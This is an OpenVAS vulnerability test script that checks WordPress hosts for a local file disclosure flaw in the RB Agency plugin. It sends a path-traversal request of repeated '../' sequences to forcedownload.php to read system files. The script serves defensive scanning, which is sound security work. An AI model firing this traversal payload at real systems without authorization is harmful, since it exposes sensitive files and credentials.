###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_rb_agency_plugin_lfi_vuln.nasl 12455 2018-11-21 09:17:27Z cfischer $
#
# WordPress RB Agency Plugin Local File Disclosure Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809037");
  script_version("$Revision: 12455 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-11-21 10:17:27 +0100 (Wed, 21 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-09-07 09:26:28 +0530 (Wed, 07 Sep 2016)");
  script_name("WordPress RB Agency Plugin Local File Disclosure Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Wordpress
  RB Agency Plugin and is prone to local file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to read arbitrary file or not.");

  script_tag(name:"insight", value:"The flaw is due to an insufficient
  validation of user supplied input via 'file' parameter to
  '/ext/forcedownload.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files and also to read sensitive information like
  username and password.");

  script_tag(name:"affected", value:"WordPress RB Agency Plugin version 2.4.7");

  script_tag(name:"solution", value:"Upgrade to WordPress RB Agency Plugin
  version 2.4.8 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40333");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://rbplugin.com");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!wordPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:wordPort)){
  exit(0);
}

if(dir == "/"){
  dir = "";
}

files = traversal_files();

foreach file (keys(files))
{
  url = dir + '/wp-content/plugins/rb-agency/ext/forcedownload.php?file=' + crap(data: "../", length: 3*15) + files[file];

  if(http_vuln_check(port:wordPort, url:url, check_header:TRUE, pattern:file))
  {
    report = report_vuln_url(port:wordPort, url:url);
    security_message(port:wordPort, data:report);
    exit(0);
  }
}
